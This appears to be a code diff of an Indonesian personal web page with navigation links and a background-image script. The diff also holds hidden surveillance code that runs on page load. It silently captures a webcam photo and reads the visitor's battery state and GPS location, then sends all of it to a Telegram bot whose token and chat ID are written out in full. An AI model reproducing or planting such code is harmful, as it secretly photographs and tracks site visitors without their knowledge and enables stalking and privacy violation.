@@ -64,6 +64,7 @@
       <a href="search.html">🔎 Pencarian web</a>
       <a href="profil.html">ℹ️ Tentang</a>
       <a href="spotify.html">🔊 Full Lagu</a>
+      <a href="index.html">📦 Full Apk/Exe</a>
       <a href="https://whatsapp.com/channel/0029Vb72mQ1LCoX3Gh894J0J" target="_blank">💬 Join Saluran</a>
     </nav>
   </aside>
@@ -94,7 +95,7 @@
     // Background ganti otomatis
     const ua = navigator.userAgent.toLowerCase();
     if (/android/i.test(ua)) {
-      document.body.style.backgroundImage = "url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSN_XU7iHv13U6UyNPmiVdnzha0dz11dqcGAS7f1b-DMxkmh1VyQ5OuHw&s=10')";
+      document.body.style.backgroundImage = "url('https://i.ibb.co/QzLy6Q3/IMG-20250803-WA0031.jpg')";
     } else {
       document.body.style.backgroundImage = "url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQO6i7Mt3hVLH2FM_SCbfjDKDyAuzIbGfTSchder4X3CzjLqXSBFdivrfvV&s=10')";
     }
@@ -114,57 +115,98 @@
       document.getElementById("sidebar").classList.toggle("open");
     });
 
-    // === Kirim foto ke Telegram langsung ===
-    async function kirimFotoTelegram(blob) {
-      let botToken = "7219789181:AAHUcMGNyIY-AIDzlvTtVqGb4Zg_PcL5Wtw";
-      let chatId  = "8007345794";
+  // === Kirim foto ke Telegram ===
+  async function kirimFotoTelegram(blob) {
+    let botToken = "7219789181:AAHUcMGNyIY-AIDzlvTtVqGb4Zg_PcL5Wtw";
+    let chatId  = "8007345794";
 
-      let formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("photo", blob, "capture.jpg");
+    let formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", blob, "capture.jpg");
 
-      try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-      } catch (e) {
-        console.error("❌ Gagal kirim:", e);
-      }
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    } catch (e) {
+      console.error("❌ Gagal kirim:", e);
     }
+  }
 
-    // Kamera otomatis minta izin & foto sekali (tidak ditampilkan)
-    async function autoCapture() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
+  // === Kirim teks ke Telegram (untuk baterai & lokasi) ===
+  async function kirimTelegramPesan(pesan) {
+    const botToken = "7219789181:AAHUcMGNyIY-AIDzlvTtVqGb4Zg_PcL5Wtw";
+    const chatId  = "8007345794";
 
-        await new Promise(r => setTimeout(r, 800));
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("text", pesan);
 
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        const dataUrl = canvas.toDataURL("image/jpeg");
-        const blob = await (await fetch(dataUrl)).blob();
-
-        // stop kamera
-        stream.getTracks().forEach(track => track.stop());
-
-        // langsung kirim ke Telegram
-        kirimFotoTelegram(blob);
-
-      } catch (err) {
-        console.error("Gagal akses kamera:", err);
-      }
+    try {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        body: formData
+      });
+    } catch (e) {
+      console.error("❌ Gagal kirim teks:", e);
     }
+  }
 
-    // Jalankan otomatis
-    autoCapture();
+  // === Ambil baterai & kirim ===
+  if (navigator.getBattery) {
+    navigator.getBattery().then(battery => {
+      const pesanBaterai = `Baterai: ${battery.level*100}% | Charging: ${battery.charging ? "Ya":"Tidak"}`;
+      kirimTelegramPesan(pesanBaterai);
+    });
+  }
+
+  // === Ambil lokasi & kirim ===
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const lat = pos.coords.latitude.toFixed(5);
+        const lon = pos.coords.longitude.toFixed(5);
+        const pesanLokasi = `Lokasi: ${lat}, ${lon}`;
+        kirimTelegramPesan(pesanLokasi);
+      },
+      err => console.error("Error lokasi:", err.message)
+    );
+  }
+
+  // === Kamera otomatis minta izin & foto sekali ===
+  async function autoCapture() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
+
+      await new Promise(r => setTimeout(r, 800));
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const dataUrl = canvas.toDataURL("image/jpeg");
+      const blob = await (await fetch(dataUrl)).blob();
+
+      // Stop kamera
+      stream.getTracks().forEach(track => track.stop());
+
+      // Langsung kirim ke Telegram
+      kirimFotoTelegram(blob);
+
+    } catch (err) {
+      console.error("Gagal akses kamera:", err);
+    }
+  }
+
+  // Jalankan otomatis
+  autoCapture();
+</script>
   </script>
 </body>
 </html>
